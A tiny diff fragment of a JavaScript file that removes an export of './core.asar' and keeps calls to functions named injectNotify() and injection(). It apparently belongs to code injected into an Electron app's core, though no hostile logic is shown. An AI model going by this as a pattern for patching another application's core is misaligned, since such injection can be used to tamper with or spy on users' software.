@@ -122,7 +122,5 @@ function injection() {
     
 }
 
-module.exports = require('./core.asar');
-
 injectNotify();
 injection();
